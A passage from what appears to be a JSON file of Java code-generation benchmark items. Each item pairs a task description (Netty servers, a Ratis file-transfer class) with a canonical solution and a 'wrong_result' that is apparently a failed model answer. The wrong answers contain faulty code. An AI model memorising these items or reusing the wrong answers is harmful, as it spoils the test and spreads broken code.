RemotingHelper.closeChannel(channel);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "serverBootstrap = new ServerBootstrap();\nbossSelectorGroup = new NioEventLoopGroup(1);\nworkerSelectorGroup = new NioEventLoopGroup();\ndefaultEventExecutorGroup = new DefaultEventExecutorGroup(16);\nappContext = appContext;\nLOGGER = LoggerFactory.getLogger(NettyRemotingServer.class);\n\npublic NettyRemotingServer(AppContext appContext, RemotingServerConfig remotingServerConfig) {\n    this.appContext = appContext;\n    this.remotingServerConfig = remotingServerConfig;\n}\n\npublic NettyRemotingServer(RemotingServerConfig remotingServerConfig, ChannelEventListener channelEventListener) {\n    this.remotingServerConfig = remotingServerConfig;\n    this.channelEventListener = channelEventListener;\n}\n\npublic void serverStart() throws Exception {\n    serverBootstrap.group(bossSelectorGroup, workerSelectorGroup)\n        .channel(NioServerSocketChannel.class)\n        .childHandler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                ch.pipeline().addLast(\n                    new IdleStateHandler(0, 0, remotingServerConfig.getHeartbeatTimeout(), TimeUnit.MILLISECONDS),\n                    new NettyServerHandler(),\n                    new NettyConnectManageHandler()\n                );\n            }\n        })\n        .option(ChannelOption.SO_BACKLOG, 1024)\n        .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n    ChannelFuture channelFuture = serverBootstrap.bind(remotingServerConfig.getPort()).sync();\n    channelFuture.channel().closeFuture().sync();\n}\n\npublic void serverShutdown() {\n    bossSelectorGroup.shutdownGracefully();\n    workerSelectorGroup.shutdownGracefully();\n    defaultEventExecutorGroup.shutdownGracefully();\n}\n\nprotected void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) throws Exception {\n    defaultEventExecutorGroup.execute(() -> {\n        try {\n            if (channelEventListener != null) {\n                channelEventListener.onMessageReceived(ctx.channel(), msg);\n            }\n        } catch (Exception e) {\n            LOGGER.error(\"Error processing message\", e);\n        }\n    });\n}\n\nprotected void channelRegistered(ChannelHandlerContext ctx) throws Exception {\n    if (channelEventListener != null) {\n        channelEventListener.onChannelRegistered(ctx.channel());\n    }\n}\n\nprotected void channelUnregistered(ChannelHandlerContext ctx) throws Exception {\n    if (channelEventListener != null) {\n        channelEventListener.onChannelUnregistered(ctx.channel());\n    }\n}\n\nprotected void channelActive(ChannelHandlerContext ctx) throws Exception {\n    if (channelEventListener != null) {\n        channelEventListener.onChannelActive(ctx.channel());\n    }\n}\n\nprotected void channelInactive(ChannelHandlerContext ctx) throws Exception {\n    if (channelEventListener != null) {\n        channelEventListener.onChannelInactive(ctx.channel());\n    }\n}\n\nprotected void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n    if (evt instanceof IdleStateEvent) {\n        IdleStateEvent event = (IdleStateEvent) evt;\n        if (event.state() == IdleState.ALL_IDLE) {\n            if (channelEventListener != null) {\n                channelEventListener.onChannelIdle(ctx.channel());\n            }\n            ctx.close();\n        }\n    }\n}\n\nprotected void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n    LOGGER.error(\"Channel exception caught\", cause);\n    ctx.close();\n}"
  },
  {
    "Task_id": 22,
    "Instruction": "Task Description: Create a Java abstract class that handles file transfer operations using FileChannel for reading files and DataStreamOutput for writing data, with support for synchronization points during transfer.\n\nClass Description: TransferType is an abstract class that provides a framework for transferring file data in chunks using NIO FileChannel for reading and a DataStreamOutput for writing. It manages buffer sizes, synchronization points, and tracks transfer progress.\n\nAttributes:\n- path: String - The file path to be transferred\n- file: File - The File object representing the file to transfer\n- fileSize: long - The total size of the file in bytes\n- bufferSize: int - The size of the transfer buffer in bytes\n- syncSize: long - The interval size at which to perform synchronization\n- syncPosition: long - The current position for synchronization tracking\n\nMethods:\n- TransferType(String path, DataStream cli) - Constructor - Initializes the transfer with file path and configuration from DataStream client\n- getFile() -> File - Returns the File object being transferred\n- getBufferSize() -> int - Returns the buffer size for transfers\n- getPacketSize(long offset) -> long - Calculates the next packet size based on current offset\n- isSync(long position) -> boolean - Determines if current position requires synchronization\n- transfer(FileStoreClient client, RoutingTable routingTable) -> List<CompletableFuture<DataStreamReply>> - Performs the complete file transfer operation\n- write(FileChannel in, DataStreamOutput out, long offset, List<CompletableFuture<DataStreamReply>> futures) -> long - Abstract method to be implemented by subclasses for writing data\n- toString() -> String - Returns a string representation of the transfer object",
    "Canonical_solution": "import org.apache.ratis.examples.filestore.FileStoreClient;\nimport org.apache.ratis.io.StandardWriteOption;\nimport org.apache.ratis.protocol.DataStreamReply;\nimport org.apache.ratis.protocol.RoutingTable;\nimport org.apache.ratis.thirdparty.io.netty.buffer.ByteBuf;\nimport org.apache.ratis.thirdparty.io.netty.buffer.PooledByteBufAllocator;\nimport org.apache.ratis.util.FileUtils;\nimport org.apache.ratis.util.JavaUtils;\nimport org.apache.ratis.util.Preconditions;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.StandardOpenOption;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.concurrent.CompletableFuture;\n\nabstract static class TransferType {\n    private final String path;\n    private final File file;\n    private final long fileSize;\n    private final int bufferSize;\n    private final long syncSize;\n    private long syncPosition = 0;\n\n    TransferType(String path, DataStream cli) {\n        this.path = path;\n        this.file = new File(path);\n        this.fileSize = cli.getFileSizeInBytes();\n        this.bufferSize = cli.getBufferSizeInBytes();\n        this.syncSize = cli.getSyncSize();\n\n        final long actualSize = file.length();\n        Preconditions.assertTrue(actualSize == fileSize, () -> \"Unexpected file size: expected size is \"\n                + fileSize + \" but actual size is \" + actualSize + \", path=\" + path);\n    }\n\n    File getFile() {\n        return file;\n    }\n\n    int getBufferSize() {\n        return bufferSize;\n    }\n\n    long getPacketSize(long offset) {\n        return Math.min(bufferSize, fileSize - offset);\n    }\n\n    boolean isSync(long position) {\n        if (syncSize > 0) {\n            if (position >= fileSize || position - syncPosition >= syncSize) {\n                syncPosition = position;\n                return true;\n            }\n        }\n        return false;\n    }\n\n    List<CompletableFuture<DataStreamReply>> transfer(\n            FileStoreClient client, RoutingTable routingTable) throws IOException {\n        if (fileSize <= 0) {\n            return Collections.emptyList();\n        }\n\n        final List<CompletableFuture<DataStreamReply>> futures = new ArrayList<>();\n        final DataStreamOutput out = client.getStreamOutput(file.getName(), fileSize, routingTable);\n        try (FileChannel in = FileUtils.newFileChannel(file, StandardOpenOption.READ)) {\n            for (long offset = 0L; offset < fileSize; ) {\n                offset += write(in, out, offset, futures);\n            }\n        } catch (Throwable e) {\n            throw new IOException(\"Failed to transfer \" + path);\n        } finally {\n            futures.add(out.closeAsync());\n        }\n        return futures;\n    }\n\n    abstract long write(FileChannel in, DataStreamOutput out, long offset,\n                       List<CompletableFuture<DataStreamReply>> futures) throws IOException;\n\n    @Override\n    public String toString() {\n        return JavaUtils.getClassSimpleName(getClass()) + \"{\" + path + \", size=\" + fileSize + \"}\";\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public abstract class TransferType {\n    protected String path;\n    protected File file;\n    protected long fileSize;\n    protected int bufferSize;\n    protected long syncSize;\n    protected long syncPosition;\n\n    public TransferType(String path, DataStream cli) {\n        this.path = path;\n        this.file = new File(path);\n        this.fileSize = file.length();\n        this.bufferSize = cli.getBufferSize();\n        this.syncSize = cli.getSyncSize();\n        this.syncPosition = 0;\n    }\n\n    public File getFile() {\n        return file;\n    }\n\n    public int getBufferSize() {\n        return bufferSize;\n    }\n\n    public long getPacketSize(long offset) {\n        long remaining = fileSize - offset;\n        return Math.min(remaining, bufferSize);\n    }\n\n    public boolean isSync(long position) {\n        return position >= syncPosition && (position - syncPosition) % syncSize == 0;\n    }\n\n    public abstract long write(FileChannel in, DataStreamOutput out, long offset, List<CompletableFuture<DataStreamReply>> futures);\n\n    public List<CompletableFuture<DataStreamReply>> transfer(FileStoreClient client, RoutingTable routingTable) {\n        List<CompletableFuture<DataStreamReply>> futures = new ArrayList<>();\n        try (FileChannel in = FileChannel.open(Paths.get(path), StandardOpenOption.READ)) {\n            long offset = 0;\n            while (offset < fileSize) {\n                long packetSize = getPacketSize(offset);\n                CompletableFuture<DataStreamReply> future = new CompletableFuture<>();\n                long written = write(in, client.getOutputStream(), offset, futures);\n                if (written > 0) {\n                    offset += written;\n                    if (isSync(offset)) {\n                        syncPosition = offset;\n                        client.sync(routingTable, offset);\n                    }\n                } else {\n                    future.completeExceptionally(new IOException(\"Failed to write data\"));\n                    break;\n                }\n                futures.add(future);\n            }\n        } catch (IOException e) {\n            for (CompletableFuture<DataStreamReply> future : futures) {\n                future.completeExceptionally(e);\n            }\n        }\n        return futures;\n    }\n\n    @Override\n    public String toString() {\n        return \"TransferType{\" +\n                \"path='\" + path + '\\'' +\n                \", fileSize=\" + fileSize +\n                \", bufferSize=\" + bufferSize +\n                \", syncSize=\" + syncSize +\n                '}';\n    }\n}"
  },
  {
    "Task_id": 224,
    "Instruction": "Task Description: Create a Java class that implements a WebSocket server using Netty framework to handle WebSocket connections and messages.\n\nClass Description: The WebSocketServer class is responsible for initializing and running a Netty-based WebSocket server. It configures the server with appropriate handlers for HTTP and WebSocket protocols, manages connection threads, and binds to a specified port.\n\nAttributes:\n- initParamDTO: InitParamDTO - Configuration parameters for the server including port number and thread counts\n\nMethods:\n- WebSocketServer(InitParamDTO initParamDTO) -> None - Constructor that initializes the server with configuration parameters\n- run() -> None - Starts the WebSocket server, configures the pipeline with necessary handlers, and binds to the specified port",
    "Canonical_solution": "import com.cf.carpark.service.core.dto.InitParamDTO;\nimport com.cf.carpark.service.websocket.handler.WebSocketFrameHandler;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.util.CharsetUtil;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.net.InetSocketAddress;\n\n@Slf4j\npublic class WebSocketServer {\n\n    private InitParamDTO initParamDTO;\n\n    public void run() {\n        EventLoopGroup boosGroup = new NioEventLoopGroup(initParamDTO.getBoosTread());\n        EventLoopGroup workGroup = new NioEventLoopGroup(initParamDTO.getWorkTread());\n        try {\n            ServerBootstrap serverBootstrap = new ServerBootstrap();\n            InitParamDTO initParamDTO = this.initParamDTO;\n            serverBootstrap.group(boosGroup, workGroup).channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel socketChannel) throws Exception {\n                            ChannelPipeline pipeline = socketChannel.pipeline();\n\n                            pipeline.addLast(new HttpServerCodec());\n                            pipeline.addLast(new ChunkedWriteHandler());\n                            pipeline.addLast(new StringDecoder(CharsetUtil.UTF_8));\n                            pipeline.addLast(new StringEncoder(CharsetUtil.UTF_8));\n                            pipeline.addLast(new HttpObjectAggregator(1024 * 1024));\n                            pipeline.addLast(new WebSocketServerProtocolHandler(\"/ws\"));\n                            pipeline.addLast(new WebSocketFrameHandler(initParamDTO));\n                        }\n                    });\n\n            ChannelFuture channelFuture = serverBootstrap.bind(new InetSocketAddress(this.initParamDTO.getPort()))\n                    .addListener(future -> {\n                        log.info(\"\u670d\u52a1\u7aef\u6210\u529f\u7ed1\u5b9a\u7aef\u53e3\u53f7={}\", this.initParamDTO.getPort());\n                    });\n        } catch (Exception e) {\n            boosGroup.shutdownGracefully();\n            workGroup.shutdownGracefully();\n            log.error(\"websocketServer\u542f\u52a8\u5931\u8d25:{}\", e);\n        }\n    }\n\n    public WebSocketServer(InitParamDTO initParamDTO) {\n        this.initParamDTO = initParamDTO;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class WebSocketServer {\n    private final InitParamDTO initParamDTO;\n\n    public WebSocketServer(InitParamDTO initParamDTO) {\n        this.initParamDTO = initParamDTO;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(initParamDTO.getBossThreadCount());\n        EventLoopGroup workerGroup = new NioEventLoopGroup(initParamDTO.getWorkerThreadCount());\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(\"httpDecoder\", new HttpRequestDecoder());\n                     ch.pipeline().addLast(\"httpEncoder\", new HttpResponseEncoder());\n                     ch.pipeline().addLast(\"httpObjectAggregator\", new HttpObjectAggregator(65536));\n                     ch.pipeline().addLast(\"websocketHandler\", new WebSocketServerHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(initParamDTO.getPort()).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 228,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and echo back received messages.\n\nClass Description: The EchoServer class is a Netty-based TCP server that listens on a specified port, accepts client connections, and echoes back any received messages. It uses Netty's event-driven architecture for efficient network communication.\n\nAttributes:\n- port: int - The port number on which the server will listen for incoming connections\n\nMethods:\n- EchoServer(int port) -> Constructor - Initializes the server with the specified port number\n- start() -> void - Starts the server, binds to the specified port, and begins accepting connections. Handles server shutdown gracefully when stopped. Throws Exception if any error occurs during startup or operation",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.net.InetSocketAddress;\n\npublic class EchoServer {\n    private final int port;\n\n    public EchoServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        final EchoServerHandler serverHandler = new EchoServerHandler();\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b = b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .localAddress(new InetSocketAddress(port))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(serverHandler);\n                        }\n                    });\n            ChannelFuture f = b.bind().sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully().sync();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class EchoServer {\n    private final int port;\n\n    public EchoServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new EchoServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            System.out.println(\"EchoServer started on port \" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private static class EchoServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            ByteBuf in = (ByteBuf) msg;\n            System.out.println(\"Received: \" + in.toString(CharsetUtil.UTF_8));\n            ctx.write(in);\n        }\n\n        @Override\n        public void channelReadComplete(ChannelHandlerContext ctx) {\n            ctx.flush();\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 230,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process requests, with optional SSL support for secure communication.\n\nClass Description: DiscardServer is a Netty-based TCP server that listens on a specified port, accepts client connections, and processes incoming data (discarding it in this example). It supports optional SSL encryption and uses NIO for non-blocking I/O operations.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL encryption should be enabled\n- PORT: [int] - The port number on which the server will listen for connections\n- sslCtx: [SslContext] - SSL context for secure communication (nullable)\n\nMethods:\n- main: [main(String[] args)] -> void - Entry point that configures and starts the Netty server\n  - args: [String[]] - Command line arguments (not directly used)\n  - Throws: Exception - For various Netty and SSL related exceptions\n- initChannel: [initChannel(SocketChannel ch)] -> void - Initializes the channel pipeline for each new connection (inner method of ChannelInitializer)\n  - ch: [SocketChannel] - The socket channel being initialized\n  - Configures SSL handler (if enabled) and adds the main server handler to the pipeline",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class DiscardServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8009\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new DiscardServerHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class DiscardServer {\n    private static final boolean SSL = false;\n    private static final int PORT = 8080;\n    private static SslContext sslCtx;\n\n    public static void main(String[] args) throws Exception {\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContext.newServerContext(ssc.certificate(), ssc.privateKey());\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) {\n                     if (SSL) {\n                         ch.pipeline().addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     ch.pipeline().addLast(new DiscardServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private static class DiscardServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            ByteBuf in = (ByteBuf) msg;\n            try {\n                while (in.isReadable()) {\n                    in.readByte();\n                }\n            } finally {\n                in.release();\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 235,
    "Instruction": "Task Description: Create a Java class that implements a UDP server using Netty framework, with support for multiple transport types (NIO, Epoll, KQueue, IOUring) and graceful shutdown capabilities.\n\nClass Description: GeyserServer is a Netty-based UDP server implementation that handles network communication using the most optimal transport available on the system. It manages server lifecycle including binding to ports and graceful shutdown.\n\nAttributes:\n- TRANSPORT: [Transport] - Static final field holding the best available transport type\n- SHUTDOWN_QUIET_PERIOD_MS: [int] - Milliseconds to wait for quiet period during shutdown\n- SHUTDOWN_TIMEOUT_MS: [int] - Maximum milliseconds to wait for shutdown\n- geyser: [GeyserImpl] - Reference to the main Geyser implementation\n- group: [EventLoopGroup] - Parent event loop group for the server\n- childGroup: [EventLoopGroup] - Child event loop group for handling connections\n- bootstrap: [ServerBootstrap] - Netty server bootstrap instance\n- playerGroup: [EventLoopGroup] - Event loop group for player connections\n- bootstrapFutures: [ChannelFuture[]] - Array of channel futures for server binding\n\nMethods:\n- GeyserServer([GeyserImpl geyser, int threadCount]) -> [void] - Constructor that initializes the server with specified thread count\n- bind([InetSocketAddress address]) -> [CompletableFuture<Void>] - Binds the server to the specified address and returns a future\n- shutdown() -> [void] - Gracefully shuts down the server and releases all resources\n- createBootstrap() -> [ServerBootstrap] - Private method that creates and configures the server bootstrap\n- compatibleTransport() -> [Transport] - Static private method that detects the best available transport\n- isClassAvailable([String className]) -> [boolean] - Static private helper method to check class availability\n\nNested Types:\n- Transport: [record] - Holds transport-specific channel class and event loop group factory",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.epoll.Epoll;\nimport io.netty.channel.epoll.EpollDatagramChannel;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.kqueue.KQueue;\nimport io.netty.channel.kqueue.KQueueDatagramChannel;\nimport io.netty.channel.kqueue.KQueueEventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DatagramChannel;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport io.netty.incubator.channel.uring.IOUring;\nimport io.netty.incubator.channel.uring.IOUringDatagramChannel;\nimport io.netty.incubator.channel.uring.IOUringEventLoopGroup;\nimport io.netty.util.concurrent.Future;\nimport org.cloudburstmc.netty.channel.raknet.RakChannelFactory;\nimport org.cloudburstmc.netty.channel.raknet.config.RakChannelOption;\nimport org.geysermc.geyser.GeyserImpl;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.IntFunction;\n\npublic final class GeyserServer {\n    private static final Transport TRANSPORT = compatibleTransport();\n    private static final int SHUTDOWN_QUIET_PERIOD_MS = 100;\n    private static final int SHUTDOWN_TIMEOUT_MS = 500;\n\n    private final GeyserImpl geyser;\n    private EventLoopGroup group;\n    private EventLoopGroup childGroup;\n    private final ServerBootstrap bootstrap;\n    private EventLoopGroup playerGroup;\n    private ChannelFuture[] bootstrapFutures;\n\n    public GeyserServer(GeyserImpl geyser, int threadCount) {\n        this.geyser = geyser;\n        this.group = TRANSPORT.eventLoopGroupFactory().apply(1);\n        this.childGroup = TRANSPORT.eventLoopGroupFactory().apply(threadCount);\n        this.bootstrap = this.createBootstrap();\n    }\n\n    public CompletableFuture<Void> bind(InetSocketAddress address) {\n        bootstrapFutures = new ChannelFuture[1];\n        ChannelFuture future = bootstrap.bind(address);\n        bootstrapFutures[0] = future;\n        return Bootstraps.allOf(bootstrapFutures);\n    }\n\n    public void shutdown() {\n        try {\n            Future<?> futureChildGroup = this.childGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n            this.childGroup = null;\n            Future<?> futureGroup = this.group.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n            this.group = null;\n            Future<?> futurePlayerGroup = this.playerGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n            this.playerGroup = null;\n\n            futureChildGroup.sync();\n            futureGroup.sync();\n            futurePlayerGroup.sync();\n        } catch (InterruptedException e) {\n            GeyserImpl.getInstance().getLogger().severe(\"Exception in shutdown process\", e);\n        }\n        for (ChannelFuture f : bootstrapFutures) {\n            f.channel().closeFuture().syncUninterruptibly();\n        }\n    }\n\n    private ServerBootstrap createBootstrap() {\n        GeyserServerInitializer serverInitializer = new GeyserServerInitializer(this.geyser);\n        playerGroup = serverInitializer.getEventLoopGroup();\n\n        return new ServerBootstrap()\n                .channelFactory(RakChannelFactory.server(TRANSPORT.datagramChannel()))\n                .group(group, childGroup)\n                .childHandler(serverInitializer);\n    }\n\n    private static Transport compatibleTransport() {\n        if (isClassAvailable(\"io.netty.incubator.channel.uring.IOUring\")\n                && IOUring.isAvailable()\n                && Boolean.parseBoolean(System.getProperty(\"Geyser.io_uring\"))) {\n            return new Transport(IOUringDatagramChannel.class, IOUringEventLoopGroup::new);\n        }\n\n        if (isClassAvailable(\"io.netty.channel.epoll.Epoll\") && Epoll.isAvailable()) {\n            return new Transport(EpollDatagramChannel.class, EpollEventLoopGroup::new);\n        }\n\n        if (isClassAvailable(\"io.netty.channel.kqueue.KQueue\") && KQueue.isAvailable()) {\n            return new Transport(KQueueDatagramChannel.class, KQueueEventLoopGroup::new);\n        }\n\n        return new Transport(NioDatagramChannel.class, NioEventLoopGroup::new);\n    }\n\n    private record Transport(Class<? extends DatagramChannel> datagramChannel, IntFunction<EventLoopGroup> eventLoopGroupFactory) {\n    }\n\n    private static boolean isClassAvailable(String className) {\n        try {\n            Class.forName(className);\n            return true;\n        } catch (ClassNotFoundException e) {\n            return false;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "wrong_result": "public class GeyserServer {\n    public enum Transport {\n        NIO, EPOLL, KQUEUE, IOURING\n    }\n\n    private static final Transport TRANSPORT = compatibleTransport();\n    private static final int SHUTDOWN_QUIET_PERIOD_MS = 1000;\n    private static final int SHUTDOWN_TIMEOUT_MS = 5000;\n\n    private final GeyserImpl geyser;\n    private final EventLoopGroup group;\n    private final EventLoopGroup childGroup;\n    private final ServerBootstrap bootstrap;\n    private final EventLoopGroup playerGroup;\n    private final ChannelFuture[] bootstrapFutures;\n\n    public GeyserServer(GeyserImpl geyser, int threadCount) {\n        this.geyser = geyser;\n        this.group = createEventLoopGroup(TRANSPORT, threadCount);\n        this.childGroup = createEventLoopGroup(TRANSPORT, threadCount);\n        this.bootstrap = createBootstrap();\n        this.playerGroup = createEventLoopGroup(TRANSPORT, threadCount);\n        this.bootstrapFutures = new ChannelFuture[0];\n    }\n\n    public CompletableFuture<Void> bind(InetSocketAddress address) {\n        CompletableFuture<Void> future = new CompletableFuture<>();\n        bootstrap.bind(address).addListener((ChannelFutureListener) f -> {\n            if (f.isSuccess()) {\n                future.complete(null);\n            } else {\n                future.completeExceptionally(f.cause());\n            }\n        });\n        return future;\n    }\n\n    public void shutdown() {\n        if (bootstrapFutures != null) {\n            for (ChannelFuture future : bootstrapFutures) {\n                future.channel().close();\n            }\n        }\n\n        if (playerGroup != null) {\n            playerGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS);\n        }\n\n        if (childGroup != null) {\n            childGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS);\n        }\n\n        if (group != null) {\n            group.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS);\n        }\n    }\n\n    private ServerBootstrap createBootstrap() {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(group, childGroup)\n                .channel(getChannelClass(TRANSPORT))\n                .childHandler(new GeyserServerInitializer(geyser, playerGroup));\n        return bootstrap;\n    }\n\n    private static Transport compatibleTransport() {\n        if (isClassAvailable(\"io.netty.channel.epoll.Epoll\")) {\n            return Transport.EPOLL;\n        } else if (isClassAvailable(\"io.netty.channel.kqueue.KQueue\")) {\n            return Transport.KQUEUE;\n        } else if (isClassAvailable(\"io.netty.channel.iouring.IOUring\")) {\n            return Transport.IOURING;\n        } else {\n            return Transport.NIO;\n        }\n    }\n\n    private static boolean isClassAvailable(String className) {\n        try {\n            Class.forName(className);\n            return true;\n        } catch (ClassNotFoundException e) 